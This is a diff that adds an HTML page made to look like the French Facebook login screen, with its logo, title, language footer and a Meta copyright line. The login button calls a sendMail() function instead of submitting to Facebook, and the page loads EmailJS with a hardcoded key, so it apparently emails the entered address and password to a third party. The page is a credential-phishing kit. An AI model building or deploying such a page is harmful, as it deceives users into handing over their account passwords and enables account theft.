@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook – log in or sign up</title>
+  <link rel="shortcut icon" href="img/favicon.webp" type="image/x-icon">
+  <link rel="stylesheet" href="style.css">
+</head>
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+</script>
+<script type="text/javascript">
+  (function(){
+     emailjs.init("6LXDeGX9Vfm6hwfJL");
+  })();
+</script>
+<script src="./script.js"></script>
+<body>
+  <section id="body_area">
+    <div id="content_area" class="container">
+      <div class="left_side">
+        <img src="img/logo.svg" alt="">
+        <h2>Avec Facebook, partagez et restez en contact avec votre entourage.</h2>
+      </div>
+      <div class="form_area">
+        <form action="">
+          <input type="email" id="email" placeholder="Adresse e-mail ou numéro de tél.">
+          <input type="password" id="pwd" placeholder="Mot de passe">
+          <input type="button" onclick="sendMail()" value="Log in">
+          <a href="#">Mot de passe oublié ?</a>
+          <hr>
+          <button  type="button">Créer nouveau compte</button>
+        </form>
+        <p><a href="#">Créer une Page</a> pour une célébrité, une marque ou une entreprise.</p>
+      </div>
+    </div>
+  </section>
+
+  <footer id="footer_area">
+    <div class="container">
+      <ul>
+        <li><a href="">English (UK)</a></li>
+        <li><a href="">বাংলা</a></li>
+        <li><a href="">অসমীয়া</a></li>
+        <li><a href="">हिन्दी</a></li>
+        <li><a href="">नेपाली</a></li>
+        <li><a href="">Bahasa Indonesia</a></li>
+        <li><a href="">العربية</a></li>
+        <li><a href="">中文(简体)</a></li>
+        <li><a href="">Bahasa Melayu</a></li>
+        <li><a href="">Español</a></li>
+        <li><a href="">Português (Brasil)</a></li>
+      </ul>
+      <p>Meta © 2024</p>
+    </div>
+
+  </footer>
+
+</body>
+
+</html>
